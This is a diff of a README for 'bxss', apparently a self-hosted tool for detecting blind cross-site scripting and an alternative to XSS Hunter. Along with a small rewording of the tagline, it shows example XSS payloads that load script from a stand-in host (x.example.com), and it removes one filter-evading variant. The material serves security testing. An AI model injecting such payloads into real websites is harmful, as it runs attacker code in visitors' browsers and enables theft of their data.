@@ -1,6 +1,6 @@
 <h1 align="center">bxss</h1>
 
-<h4 align="center">My alternative to XSS Hunter to find blind XSS.</h4>
+<h4 align="center">My alternative to XSS Hunter for blind XSS.</h4>
 
 <p align="center">
     <img src="https://img.shields.io/badge/php-%3E=5.5-blue" alt="php badge">
@@ -51,10 +51,7 @@ Using Apache, you can easily configure a vhost like this:
 As soon as the script is available online, you can use your favorite XSS payload:
 ```
 <script src=http://x.example.com></script>
-<scr<script src=//x.example.com>
-...
 ```
-
 
 ---
 
